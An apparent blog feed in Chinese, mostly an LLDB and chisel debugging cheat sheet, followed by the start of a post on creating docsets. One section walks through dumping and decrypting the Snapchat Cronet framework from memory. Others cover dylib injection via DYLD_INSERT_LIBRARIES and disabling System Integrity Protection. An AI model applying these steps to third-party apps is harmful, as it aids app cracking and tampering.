<h3 id="threadinfo-输出当前线程的信息。"><a href="#threadinfo-输出当前线程的信息。" class="headerlink" title="threadinfo:输出当前线程的信息。"></a>threadinfo:输出当前线程的信息。</h3><h3 id="b-ptrace-c-xxx-满足某个条件之后程序才会中断。"><a href="#b-ptrace-c-xxx-满足某个条件之后程序才会中断。" class="headerlink" title="b ptrace -c xxx:满足某个条件之后程序才会中断。"></a>b ptrace -c xxx:满足某个条件之后程序才会中断。</h3><h3 id="help-apropos"><a href="#help-apropos" class="headerlink" title="help&#x2F;apropos"></a>help&#x2F;apropos</h3><h3 id="xcode预处理快捷键"><a href="#xcode预处理快捷键" class="headerlink" title="xcode预处理快捷键"></a>xcode预处理快捷键</h3><p>单击 Product -&gt; PerformAction -&gt;Preprocess xxxx 可以对文件进行预处理，还可以将代码转换成汇编代码。可以帮助我们理解这些宏的作用</p>
<h3 id="pdb来排查了一个脚本中的问题"><a href="#pdb来排查了一个脚本中的问题" class="headerlink" title="pdb来排查了一个脚本中的问题"></a>pdb来排查了一个脚本中的问题</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(lldb) findclass</span><br><span class="line">error: libarclite_macosx.a(arclite.o) failed to load objfile for /Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/arc/libarclite_macosx.a</span><br><span class="line">error: libarclite_macosx.a(arclite.o) failed to load objfile for /Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/arc/libarclite_macosx.a</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;/Users/gogleyin/lldb/findclass.py&quot;, line 40, in findclass</span><br><span class="line">    raise AssertionError(&quot;Uhoh... something went wrong, can you figure it out? :]&quot;)</span><br><span class="line">AssertionError: Uhoh... something went wrong, can you figure it out? :]</span><br><span class="line"></span><br><span class="line">(lldb) script import pdb</span><br><span class="line">(lldb) findclass</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;/Users/gogleyin/lldb/findclass.py&quot;, line 40, in findclass</span><br><span class="line">    raise AssertionError(&quot;Uhoh... something went wrong, can you figure it out? :]&quot;)</span><br><span class="line">AssertionError: Uhoh... something went wrong, can you figure it out? :]</span><br><span class="line"></span><br><span class="line">(lldb) script pdb.pm()</span><br><span class="line">&gt; /Users/gogleyin/lldb/findclass.py(40)findclass()</span><br><span class="line">-&gt; raise AssertionError(&quot;Uhoh... something went wrong, can you figure it out? :]&quot;)</span><br><span class="line"></span><br><span class="line">(Pdb) print(codeString)  # 这个东西包含了一段oc代码，用oc runtime来找出runtime的所有类</span><br><span class="line">    @import Foundation;</span><br><span class="line">    int numClasses;</span><br><span class="line">    Class * classes = NULL;</span><br><span class="line">    classes = NULL;</span><br><span class="line">    numClasses = objc_getClassList(NULL, 0);</span><br><span class="line">    NSMutableString *returnString = [NSMutableString string];</span><br><span class="line">    classes = (__unsafe_unretained Class *)malloc(sizeof(Class) * numClasses);</span><br><span class="line">    numClasses = objc_getClassList(classes, numClasses);</span><br><span class="line">    for (int i = 0; i &lt; numClasses; i++) &#123;</span><br><span class="line">      Class c = classes[i];</span><br><span class="line">      [returnString appendFormat:@&quot;%s,&quot;, class_getName(c)];</span><br><span class="line">    &#125;</span><br><span class="line">    free(classes);</span><br><span class="line">    returnString;  # 返回returnString的值给Python脚本</span><br><span class="line"></span><br><span class="line">(Pdb) l 35, 45  # 会列出35到45行代码，注意40行的 -&gt; 表示当前pdb停在的位置</span><br><span class="line"> 35         &#x27;&#x27;&#x27;</span><br><span class="line"> 36</span><br><span class="line"> 37         res = lldb.SBCommandReturnObject()</span><br><span class="line"> 38         debugger.GetCommandInterpreter().HandleCommand(&quot;expression -lobjc -O -- &quot; + codeString, res)</span><br><span class="line"> 39         if res.GetError():</span><br><span class="line"> 40  -&gt;         raise AssertionError(&quot;Uhoh... something went wrong, can you figure it out? :]&quot;)</span><br><span class="line"> 41         elif not res.HasResult():</span><br><span class="line"> 42             raise AssertionError(&quot;There&#x27;s no result. Womp womp....&quot;)</span><br><span class="line"> 43</span><br><span class="line"> 44         returnVal = res.GetOutput()</span><br><span class="line"> 45         resultArray = returnVal.split(&quot;,&quot;)</span><br><span class="line"># 嗯，似乎res.GetError()看起来更加有趣，玩一下先</span><br><span class="line"></span><br><span class="line">(Pdb) print res.GetError()</span><br><span class="line">error: &#x27;objc_getClassList&#x27; has unknown return type; cast the call to its declared return type</span><br><span class="line">error: &#x27;objc_getClassList&#x27; has unknown return type; cast the call to its declared return type</span><br><span class="line">error: &#x27;class_getName&#x27; has unknown return type; cast the call to its declared return type</span><br><span class="line"># 到这里可以看到，问题是codeString里面的代码让LLDB迷惑了。</span><br><span class="line"># 实际这种错误在LLDB里面是非常常见的。你需要告诉LLDB一个函数的返回类型，因为它无法知道那是啥。</span><br><span class="line"># 在这个case下， objc_getClassList 和 class_getName 都有未知的返回类型</span><br><span class="line"># Google一下便知这两个函数的签名如下：</span><br><span class="line"> int objc_getClassList(Class *buffer, int bufferCount);</span><br><span class="line">const char * class_getName(Class cls);</span><br><span class="line"># 所有我们需要做的事转换返回类型到正确的值就可以啦。如下：</span><br><span class="line"></span><br><span class="line">codeString = r&#x27;&#x27;&#x27;</span><br><span class="line">@import Foundation;</span><br><span class="line">int numClasses;</span><br><span class="line">Class * classes = NULL;</span><br><span class="line">classes = NULL;</span><br><span class="line">numClasses = (int)objc_getClassList(NULL, 0);</span><br><span class="line">NSMutableString *returnString = [NSMutableString string];</span><br><span class="line">classes = (__unsafe_unretained Class *)malloc(sizeof(Class) *numClasses);</span><br><span class="line">numClasses = (int)objc_getClassList(classes, numClasses);</span><br><span class="line">for (int i = 0; i &lt; numClasses; i++) &#123;</span><br><span class="line">  Class c = classes[i];</span><br><span class="line">  [returnString appendFormat:@&quot;%s,&quot;, (char *)class_getName(c)];</span><br><span class="line">&#125;</span><br><span class="line">free(classes);</span><br><span class="line">returnString;</span><br><span class="line"></span><br><span class="line">--debug选项是定位JIT代码中的问题的非常好的手段,调试lldb 的好方法</span><br><span class="line">expression --debug -lobjc -O --</span><br><span class="line">可以选择使用frame variable命令打印变量</span><br></pre></td></tr></table></figure>

<h3 id="基本的类："><a href="#基本的类：" class="headerlink" title="基本的类："></a>基本的类：</h3><ul>
<li>lldb.SBDebugger：在你的脚本中用来访问类的实例的类，非常中心，还处理LLDB命令的输入和输出</li>
<li>lldb.SBTarget：与被调试的可执行文件有关（相关调试文件，磁盘上的文件）。<br>你可以用SBDebugger的实例来获取到当前选择的SBTarget。然后 你就可以通过SBTarget访问大部分其余类。</li>
<li>lldb.SBProcess：SBTarget和SBProcess是一对多的关系：SBTarget管理者一个或多个SBProcess实例。SBProcess处理内存读写还有它自己的线程。</li>
<li>lldb.SBThread：管理对应线程的栈帧和stepping的控制逻辑</li>
<li>lldb.SBFrame：管理局部变量（debug信息有提供的）和当时的寄存器快照</li>
<li>lldb.SBModule：代表着一个可执行文件。</li>
<li>lldb.SBFunction：这代表着一个加载到内存中的函数（或者对应代码），它与SBFrame是一对一的关系。<br>实例是 lldb.debugger&#x2F;lldb.target…<br><a href="https://lldb.llvm.org/python_reference/index.html">https://lldb.llvm.org/python_reference/index.html</a><br><img src="/pic/1.jpg"><br>演示了LLDB Python主要的几个类之间的相互关系<br><img src="/pic/2.jpg"><br>暂停在某函数时几个类的交互</li>
</ul>
<h2 id="android"><a href="#android" class="headerlink" title="android"></a>android</h2><h2 id="iOS"><a href="#iOS" class="headerlink" title="iOS"></a>iOS</h2><h3 id="砸壳"><a href="#砸壳" class="headerlink" title="砸壳"></a>砸壳</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cronet.framework git:(master) X otool -hf Cronet Fat headers</span><br><span class="line">fat_magic 0xcafebabe</span><br><span class="line">nfat_arch 2</span><br><span class="line">architecture 0  cputype 12 cpusubtype 9  capabilities 0x0</span><br><span class="line">	offset 16384 size 2749664 align 2A14 (16384)</span><br><span class="line">architecture 1 cputype 16777228 cpusubtype 0 capabilities 0x0</span><br><span class="line">	offset 2768896 size 3612224 align 2A14 (16384)</span><br><span class="line">Mach header</span><br><span class="line">	magic cputype cpusubtype caps filetype ncmds sizeofcmds flags</span><br><span class="line">	Oxfeedface 12 9 0x00 6 27 3328 0x00118085</span><br><span class="line">Mach header</span><br><span class="line">	magic cputype cpusubtype caps filetype ncmds sizeofcmds flags</span><br><span class="line">	0xfeedfacf 16777228 0 0x00 6 27 3816 0X00118085</span><br><span class="line"></span><br><span class="line">otool -arch arm64 -1 Cronet | grep crypt</span><br><span class="line">cryptoff 16384</span><br><span class="line">cryptsize 3309568</span><br><span class="line">cryptid 1</span><br><span class="line">(lldb) im li Cronet</span><br><span class="line">[0] 188F5BF7-B4C4-36EF-BB9A-976FA870F9D7 0x0000000105920000 /private/var/mobile/Containers/Bundle/Application/3A4C68EB-4059-47D4-ACE6-BE9C492DF205/ Snapchat.app/Frameworks/Cronet.framework/Cronet (0x0000000105920000)</span><br><span class="line">(lldb) memory read --force --outfile ~/Desktop/dumpoutput --binary count 3309568 16384+0x0000000105920000</span><br><span class="line">因为dump出来的文件都没有Mach-0文件头，所以在这里要先把dump出来的数据写回原 来加密的文件，以替换原来加密的部分</span><br><span class="line">2768896(之前获取的ARM64架构的偏移值)+16384(加密数据的偏移值)=2785280(写入的加密数据在文件中的偏移值)</span><br><span class="line">seek=n   Seek n blocks from the beginning of the output before copying.</span><br><span class="line">bs=n     Set both input and output block size to n bytes</span><br><span class="line">conv=value[,value ...]</span><br><span class="line">	notrunc  Do not truncate the output file.</span><br><span class="line">Cronet.framework git:(master) X dd seek=2785280 bs=l conv=notrunc if=/Users/monkey/Desktop/dumpoutput of=./Cronet</span><br><span class="line">3309568+0 records in</span><br><span class="line">3309568+0 records out</span><br><span class="line">3309568 bytes transferred in 4.698067 secs (704453 bytes/sec)</span><br><span class="line">Cronet.framework git:(master) X lipo Cronet -thin arm64 -output Cronet_arm64</span><br><span class="line">MachOView.app 修改Cronet_arm64 crypid 为0</span><br></pre></td></tr></table></figure>
<h3 id="查询按钮事件"><a href="#查询按钮事件" class="headerlink" title="查询按钮事件"></a>查询按钮事件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error: error: use of undeclared identifier &#x27;UIApplication&#x27;</span><br><span class="line">None</span><br><span class="line">(lldb) expression @import UIKit</span><br><span class="line">pviews</span><br><span class="line">   |    |    |    |    |    |    |    |    |    | &lt;UIButtonLabel: 0x101c730a0; frame = (7.5 12.5; 69.5 20.5); text = &#x27;所有图书&#x27;; opaque = NO; userInteractionEnabled = NO; layer = &lt;_UILabelLayer: 0x174295a90&gt;&gt;</span><br><span class="line">   |    |    |    |    |    |    |    |    |    |    | &lt;_UILabelContentLayer: 0x170425fa0&gt; (layer)</span><br><span class="line">   |    |    |    |    |    |    |    |    | &lt;IMTouchInsetsButton: 0x101c73f60; baseClass = UIButton; frame = (324 5.5; 35 33); opaque = NO; layer = &lt;CALayer: 0x17422d880&gt;&gt;</span><br><span class="line">   |    |    |    |    |    |    |    |    |    | &lt;UIButtonLabel: 0x101c31460; frame = (9 6.5; 35 20.5); text = &#x27;选择&#x27;; opaque = NO; userInteractionEnabled = NO; layer = &lt;_UILabelLayer: 0x174295360&gt;&gt;</span><br><span class="line"></span><br><span class="line">查看 “登录”按钮UIButtonLabel的响应链</span><br><span class="line">presponder 0x101c31460</span><br><span class="line">(lldb) presponder 0x101c31460</span><br><span class="line">&lt;UIButtonLabel: 0x101c31460; frame = (9 6.5; 35 20.5); text = &#x27;选择&#x27;; opaque = NO; userInteractionEnabled = NO; layer = &lt;_UILabelLayer: 0x174295360&gt;&gt;</span><br><span class="line">   | &lt;IMTouchInsetsButton: 0x101c73f60; baseClass = UIButton; frame = (324 5.5; 35 33); opaque = NO; layer = &lt;CALayer: 0x17422d880&gt;&gt;</span><br><span class="line">   |    | &lt;IMToolbar: 0x101c1d8b0; baseClass = UIToolbar; frame = (0 20; 375 44); opaque = NO; autoresize = W; tintColor = UIExtendedSRGBColorSpace 0 0.478431 1 1; layer = &lt;CALayer: 0x174224ec0&gt;&gt;</span><br><span class="line">查看“登录”按钮的Action事件</span><br><span class="line">(lldb) pactions 0x101c73f60</span><br><span class="line">&lt;BKLibraryViewController: 0x102817600&gt;: editButtonPressed:</span><br></pre></td></tr></table></figure>
<h3 id="chisel-打印结构"><a href="#chisel-打印结构" class="headerlink" title="chisel 打印结构"></a>chisel 打印结构</h3><p>brew install chisel –verbose</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt; NSMallocBlock : 0Xl7444b6d0&gt;</span><br><span class="line">(lldb) pblock 0xl7444b6d0</span><br><span class="line"></span><br><span class="line">(lldb) pvc</span><br><span class="line">&lt;ICSplitViewController 0x10079eab0&gt;, state: appeared, view: &lt;UILayoutContainerView 0x1009261c0&gt;</span><br><span class="line">   | &lt;UIMultiColumnViewController 0x10079f410&gt;, state: appeared, view: &lt;UIView 0x1007aee70&gt;</span><br><span class="line"></span><br><span class="line">(lldb) methods 0x10079eab0</span><br><span class="line">&lt;ICSplitViewController: 0x10079eab0&gt;:</span><br><span class="line">in ICSplitViewController:</span><br><span class="line">	Properties:</span><br><span class="line">		@property (nonatomic, getter=isDetailDimmed) BOOL detailDimmed;  (@synthesize detailDimmed = _detailDimmed;)</span><br></pre></td></tr></table></figure>
<h4 id="对象查找"><a href="#对象查找" class="headerlink" title="对象查找"></a>对象查找</h4><p>fv	用正则查找所有类的 view 实例<br>fvc	用正则查找所有类的 view controller 实例<br>findinstances	在内存中查找某个类的所有实例<br>flicker	闪烁某个 view，用于快速定位</p>
<h4 id="对象分析"><a href="#对象分析" class="headerlink" title="对象分析"></a>对象分析</h4><p>pinternals	打印对象内部的所有实例变量<br>pkp	用 -valueForKeyPath:获取对象的数据<br>pmethods	打印类的所有方法<br>poobjc	用 ObjC++ 语言执行和获取表达式的结果，expression -O -l ObjC++ —的缩写<br>pproperties	打印对象或者类的属性<br>pivar	打印对象的某个 ivar<br>wivar	给对象的某个实例变量地址设置 watchpoint，监控变化<br>pclass	打印某个对象的类继承链<br>pbcopy	打印对象并且把结果复制到粘贴板<br>pblock	打印 block 的实现函数地址和签名<br>pactions	打印 UIControl 的 target 和 action</p>
<h4 id="视图查找"><a href="#视图查找" class="headerlink" title="视图查找"></a>视图查找</h4><p>visualize	显示 UIImage, CGImageRef, UIView 或 CALayer 的图片内容，用 Mac 的预览打开，在调试绘图时非常有用<br>taplog	打印触摸到的 view，用于快速定位<br>border	给 view 加上边框，用于定位某个 view 对象<br>unborder	移除 view 或 layer 的边框<br>caflush	修改 UI 后刷新 Core Animation 界面<br>hide	隐藏 view 或 layer<br>show	显示一个 view 或者 layer，相当于执行view.hidden &#x3D; NO<br>mask	给 view 添加半透明的 mask，可以用来查找被隐藏的 view<br>unmask	移除 view layer 的 mask<br>setinput	给作为 first responder 的 text field 或 text view 输入文本<br>slowanim	减慢动画速度<br>unslowanim	动画速度回复正常<br>present	Present 一个 view controller<br>dismiss	消除 present 出来的 view controller</p>
<h4 id="视图层级"><a href="#视图层级" class="headerlink" title="视图层级"></a>视图层级</h4><p>pvc	循环打印 view controller 的层级<br>pviews	循环打印 view 的层级<br>pca	打印 layer 树<br>vs	在 view 层级中搜索 view<br>ptv	打印最顶层的 table view<br>pcells	打印最顶层 table view 的所有可见的 cell<br>presponder	打印 UIResponder 响应者链</p>
<h4 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h4><p>sequence	执行多条命令，用;分隔<br>pjson	打印 NSDictionary 或 NSArray 的 JSON 格式<br>pcurl	用 curl 的格式显示 NSURLRequest (HTTP)<br>pdata	用字符串的形式显示 NSData<br>mwarning	模拟内存警告</p>
<h4 id="视图调试"><a href="#视图调试" class="headerlink" title="视图调试"></a>视图调试</h4><p>alamborder	给有约束错误的 view 加上边框<br>alamunborder	有约束错误的 view 加上边框<br>paltrace	打印 view 的约束信息，相当于调用_autolayoutTrace<br>panim	是否正在执行动画，相当于调用[UIView _isInAnimationBlock]</p>
<h3 id="NSObject私有方法，可以方便查看对象的内容："><a href="#NSObject私有方法，可以方便查看对象的内容：" class="headerlink" title="NSObject私有方法，可以方便查看对象的内容："></a>NSObject私有方法，可以方便查看对象的内容：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_methodDescription：打印对象或者类的整个继承链上的方法列表，同时显示方法的地址，可以直接用于断点</span><br><span class="line">_shortMethodDescription ：打印对象或者类的方法列表，不显示父类</span><br><span class="line">_ivarDescription：打印对象或者类的所有实例变量和值</span><br></pre></td></tr></table></figure>

<h3 id="搜索UITextField的实例对象和Cycript中的choose—样的"><a href="#搜索UITextField的实例对象和Cycript中的choose—样的" class="headerlink" title="搜索UITextField的实例对象和Cycript中的choose—样的"></a>搜索UITextField的实例对象和Cycript中的choose—样的</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search UIButton</span><br><span class="line">search UITextField</span><br><span class="line"># Find all UIViews, ignore subclasses</span><br><span class="line">find UIView  -e</span><br><span class="line"></span><br><span class="line"># Find all instances of UIViews (and subclasses) where tag == 5</span><br><span class="line">find UIView -c &quot;[obj tag] == 5&quot;</span><br></pre></td></tr></table></figure>
<h3 id="读取内存"><a href="#读取内存" class="headerlink" title="读取内存"></a>读取内存</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">memory read --size 4 --format x --count 4 0xbffff3c0</span><br><span class="line">me r -s4 -fx -c4 0xbffff3c0</span><br></pre></td></tr></table></figure>
<h3 id="查看对象内存关系-xcode观看"><a href="#查看对象内存关系-xcode观看" class="headerlink" title="查看对象内存关系,xcode观看"></a>查看对象内存关系,xcode观看</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/Applications/Xcode.app/Contents/SharedFrameworks/LLDB.framework/Versions/A/Resources/Python/lldb/macosx/heap.py</span><br><span class="line">command alias iheap command script import lldb.macosx.heap</span><br><span class="line">&quot;malloc_info&quot;, &quot;ptr_refs&quot;, &quot;cstr_refs&quot;, &quot;find_variable&quot;, and &quot;objc_refs&quot;</span><br><span class="line"></span><br><span class="line">ptr_refs</span><br><span class="line">可以在内存中找出哪些地址引用了某个指针，也就相当于查看某个变量在哪里被引用。</span><br><span class="line"></span><br><span class="line">cstr_refs</span><br><span class="line">在内存中寻找某个C String在哪里被引用。</span><br><span class="line"></span><br><span class="line">find_variable</span><br><span class="line">在当前栈帧上寻找某个局部变量在哪里被引用。</span><br><span class="line"></span><br><span class="line">objc_refs</span><br><span class="line">在内存中寻找某个类的实例。</span><br><span class="line"></span><br><span class="line">为了查看某个对象内存分配的调用堆栈，需要在程序启动的环境变量中设置 MallocSlack Logging。</span><br><span class="line">在环境变量中增加 MallocStackLogging 的值1</span><br><span class="line">单击Xcode调试工具栏上的“Debug Momery Graph”按钮</span><br><span class="line"></span><br><span class="line">malloc_info --stack-history 0x10010d680。可以快速追溯对象的创建来源，</span><br><span class="line">参考iOS逆向：在任意app上开启malloc stack追踪内存来源</span><br><span class="line">https://www.jianshu.com/p/759015369b6f</span><br><span class="line">lldb有一个内存调试工具malloc stack，开启以后就可以查看某个内存地址的malloc和free记录，追踪对象是在哪里创建的。</span><br><span class="line"></span><br><span class="line">这个工具可以打印出对象创建的堆栈，而在逆向时，也经常需要追踪某些方法的调用栈，如果可以随时打印出某个对象的创建记录，也就能直接找到其所在的类和方法，不用再花费大量的时间去打log和动态调试追踪了。</span><br></pre></td></tr></table></figure>
<h3 id="执行script"><a href="#执行script" class="headerlink" title="执行script"></a>执行script</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(lldb) e @import UIKit</span><br><span class="line">(lldb) e UIApplication *$app = [UIApplication sharedApplication];</span><br><span class="line">(lldb) e UlWindow *$keyWindow = $app.keyWindow</span><br><span class="line">(lldb) e UlViewController *$root = $keyWindow.rootViewController</span><br><span class="line">(lldb) po $root</span><br><span class="line">&lt;NavigationController: 0xl2c03d200&gt;</span><br><span class="line">(lldb) e [(SCButton *)0xl2bd4b760 setTitle:@&quot;AloneMonkey&quot; forStaterUIControlStateNormal]</span><br><span class="line">(lldb) e (void)[CATransaction flush]</span><br><span class="line">(lldb) c</span><br></pre></td></tr></table></figure>
<h3 id="在-Snapchat模块中查看与login有关的符号信息"><a href="#在-Snapchat模块中查看与login有关的符号信息" class="headerlink" title="在 Snapchat模块中查看与login有关的符号信息"></a>在 Snapchat模块中查看与login有关的符号信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">image lookup -rn login UserLogin</span><br><span class="line"></span><br><span class="line">(lldb) b -[UIView setTail:]</span><br><span class="line">Breakpoint 3: where = UserLogin`-[UIView(Frame) setTail:] at UIView+Frame.m:102, address = 0x0000000100b5ee34</span><br><span class="line">(lldb) il 0x0000000100b5ee34</span><br><span class="line">image lookup -a 0x0000000100b5ee34</span><br></pre></td></tr></table></figure>

<h3 id="xcode-设置环境变量"><a href="#xcode-设置环境变量" class="headerlink" title="xcode 设置环境变量"></a>xcode 设置环境变量</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">打印参数和当前的环境变量, segment加载的详细信息,加载dylib,显示是否加载,各阶段的时间消耗</span><br><span class="line">xcode  DYLD_PRINT_OPTS, DYLD_PRINT_EN, DYLD_PRINT_SEGMENTS</span><br><span class="line"></span><br><span class="line">签名InsertDyUb.dylib,拷贝 InsertDylib.dylib 到Bundle Resources</span><br><span class="line">xcode  设置环境变量DYLD_INSERT_LIBRARIES @executable_path/InsertDylib.dylib</span><br><span class="line"></span><br><span class="line">xcode  设置环境变量 DYLD_PRINT_INTERPOSING 运行 App,日志如下即为hook生效</span><br><span class="line">dyld: interposing 2 tuples onto image: /var/containers/Bundle/Application/AB57C532-19F2-4022-B757-7D211296E64D/AppStart.app/InsertDylib.dylib</span><br><span class="line"></span><br><span class="line">xcode 设置 DYLD_PRINT_STATISTICS,DYLD_PRINT_STATISTICS_DETAILS 打印各阶段的时间消耗。</span><br><span class="line"></span><br><span class="line">@executable_path:表示可执行程序所在的目录，一般是xxx.app</span><br><span class="line">@loader_path:表示每一个被加载的二进制文件的目录。例如，xxxx.plugin/aaa/abc依赖xxx.plugin/bb/ccc.dylib,那么依赖的路径可以写成 @loader_path/../bbb. 这样不管xxx.plugin放在那都能找到ccc.dylib</span><br><span class="line">@rpath:这个变量是在 Xcode build里面设置， Dynamic Libray Install Name设置为(#=@path/xxx/xxx,就可以在使用的工程中设置一个或多个RunPath Search Paths 来指定搜索路径。在运行时，会将@rpath分别替换为Runpath Search Paths中指定的路径来査找动态库。</span><br></pre></td></tr></table></figure>

<h3 id="iOS-分析常见点"><a href="#iOS-分析常见点" class="headerlink" title="iOS 分析常见点"></a>iOS 分析常见点</h3><p>见整理的xmind</p>
<h2 id="macos"><a href="#macos" class="headerlink" title="macos"></a>macos</h2><p>查询相关 dash lldb3:<br>记录一些常用的点,基本可以用于iOS 或其他</p>
<h3 id="调试开启配置"><a href="#调试开启配置" class="headerlink" title="调试开启配置"></a>调试开启配置</h3><h4 id="wait-for-pid"><a href="#wait-for-pid" class="headerlink" title="wait for pid"></a>wait for pid</h4><p>This will tell LLDB to attach to the process named Finder whenever it next launches.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lldb -n Finder -w</span><br><span class="line">process attach --name &quot;Finder&quot; --waitfor</span><br></pre></td></tr></table></figure>
<h4 id="直接调试启动"><a href="#直接调试启动" class="headerlink" title="直接调试启动"></a>直接调试启动</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lldb -f /bin/ls</span><br><span class="line">process launch</span><br></pre></td></tr></table></figure>
<h4 id="将Speech框架加载到DeleteMe流程空间"><a href="#将Speech框架加载到DeleteMe流程空间" class="headerlink" title="将Speech框架加载到DeleteMe流程空间"></a>将Speech框架加载到DeleteMe流程空间</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(lldb) process load /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneSimulator.platform/Developer/SDKs/iPhoneSimulator.sdk//System/Library/Frameworks/Speech.framework/Speech</span><br></pre></td></tr></table></figure>

<h4 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h4><h5 id="Disabling-Rootless"><a href="#Disabling-Rootless" class="headerlink" title="Disabling Rootless"></a>Disabling Rootless</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Command + R,start your macOS machine.</span><br><span class="line">csrutil disable &amp;&amp; reboot</span><br></pre></td></tr></table></figure>
<h4 id="w工作目录"><a href="#w工作目录" class="headerlink" title="-w工作目录"></a>-w工作目录</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">选项在哪里启动来更改当前的工作目录。输入以下内容：</span><br><span class="line">(lldb) process launch -w /Applications</span><br></pre></td></tr></table></figure>
<h4 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h4><p>(lldb) process launch -v LSCOLORS&#x3D;Af -v CLICOLOR&#x3D;1  – &#x2F;Applications&#x2F;</p>
<h4 id="设置新目标"><a href="#设置新目标" class="headerlink" title="设置新目标"></a>设置新目标</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(lldb) target delete</span><br><span class="line">(lldb) target create /usr/bin/wc</span><br></pre></td></tr></table></figure>


<h3 id="打印相关"><a href="#打印相关" class="headerlink" title="打印相关"></a>打印相关</h3><h4 id="设置后刷新"><a href="#设置后刷新" class="headerlink" title="设置后刷新"></a>设置后刷新</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">po [$rdi setHidden:!(BOOL)[$rdi isHidden]]; [CATransaction flush]</span><br></pre></td></tr></table></figure>
<h4 id="输出模块中的函数"><a href="#输出模块中的函数" class="headerlink" title="输出模块中的函数"></a>输出模块中的函数</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(lldb) image lookup -rn _block_invoke Commons</span><br></pre></td></tr></table></figure>

<h3 id="调试函数单步相关"><a href="#调试函数单步相关" class="headerlink" title="调试函数单步相关"></a>调试函数单步相关</h3><h4 id="步入无符号"><a href="#步入无符号" class="headerlink" title="步入无符号"></a>步入无符号</h4><p>(lldb) step -a0<br>This tells LLDB to step in regardless of whether you have the required debug symbols or not.</p>
<h4 id="pdb调试"><a href="#pdb调试" class="headerlink" title="pdb调试"></a>pdb调试</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def your_first_command(debugger, command, result, internal_dict):</span><br><span class="line">    import pdb; pdb.set_trace()</span><br><span class="line">    print (&quot;hello world&quot;)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>tools</category>
        <category>lldb</category>
        <category>tips</category>
      </categories>
      <tags>
        <tag>脚本</tag>
        <tag>tips</tag>
        <tag>lldb</tag>
      </tags>
  </entry>
  <entry>
    <title>如何创建docset</title>
    <url>/2020/02/22/config/%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BAdocset/</url>
    <content><![CDATA[<ul>
<li><a href="#1-docset">1. docset</a><ul>
<li><a href="#11-%E9%98%85%E8%AF%BB%E6%9C%AC%E7%AF%87%E6%96%87%E7%AB%A0%E9%9C%80%E6%B1%82">1.1. 阅读本篇文章需求</a></li>
<li><a href="#12-%E4%BB%80%E4%B9%88%E6%98%AFdocset">1.2. 什么是docset</a></li>
<li><a href="#13-%E5%93%AA%E9%87%8C%E5%8F%AF%E4%BB%A5%E4%B8%8B%E8%BD%BDdocset">1.3. 哪里可以下载docset</a></li>
<li><a href="#14-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E8%87%AA%E5%B7%B1%E7%94%9F%E6%88%90docset">1.4. 为什么要自己生成docset</a></li>
<li><a href="#15-%E5%93%AA%E9%87%8C%E8%BD%AF%E4%BB%B6%E6%94%AF%E6%8C%81docset">1.5. 哪里软件支持docset</a><ul>
<li><a href="#151-dash">1.5.1. dash</a></li>
<li><a href="#152-%E7%B1%BB%E4%BC%BCdash%E7%9A%84%E5%B7%A5%E5%85%B7">1.5.2. 类似dash的工具</a></li>
<li><a href="#153-%E5%AE%98%E6%96%B9%E5%B7%A5%E5%85%B7%E6%94%AF%E6%8C%81%E8%87%AA%E5%AE%9A%E4%B9%89docset">1.5.3. 官方工具支持自定义docset</a><ul>
<li><a href="#1531-doc2dash">1.5.3.1. doc2dash</a></li>
<li><a href="#1532-dash-docset-builder">1.5.3.2. dash-docset-builder</a></li>
</ul>
</li>
<li><a href="#154-%E5%AE%98%E6%96%B9%E6%89%8B%E5%8A%A8%E6%96%B9%E6%B3%95%E8%87%AA%E5%AE%9A%E4%B9%89docset">1.5.4. 官方手动方法自定义docset</a></li>
<li><a href="#155-%E8%87%AA%E5%AE%9A%E4%B9%89%E7%94%9F%E6%88%90docset">1.5.5. 自定义生成docset</a><ul>
<li><a href="#1551-%E8%8E%B7%E5%8F%96htm%E5%B9%B6%E7%94%9F%E6%88%90docset">1.5.5.1. 获取htm,并生成docset</a></li>
<li><a href="#1552-%E5%88%9B%E5%BB%BA%E7%B4%A2%E5%BC%95">1.5.5.2. 创建索引</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#16-%E6%80%BB%E7%BB%93">1.6. 总结</a></li>
</ul>
</li>
</ul>
<span id="more"></span>
<h1 id="1-docset"><a href="#1-docset" class="headerlink" title="1. docset"></a>1. docset</h1><h2 id="1-1-阅读本篇文章需求"><a href="#1-1-阅读本篇文章需求" class="headerlink" title="1.1. 阅读本篇文章需求"></a>1.1. 阅读本篇文章需求</h2><p>1.知道docset是什么，后面会介绍<br>2.知道dash 如何使用，或者知道怎么使用docset</p>
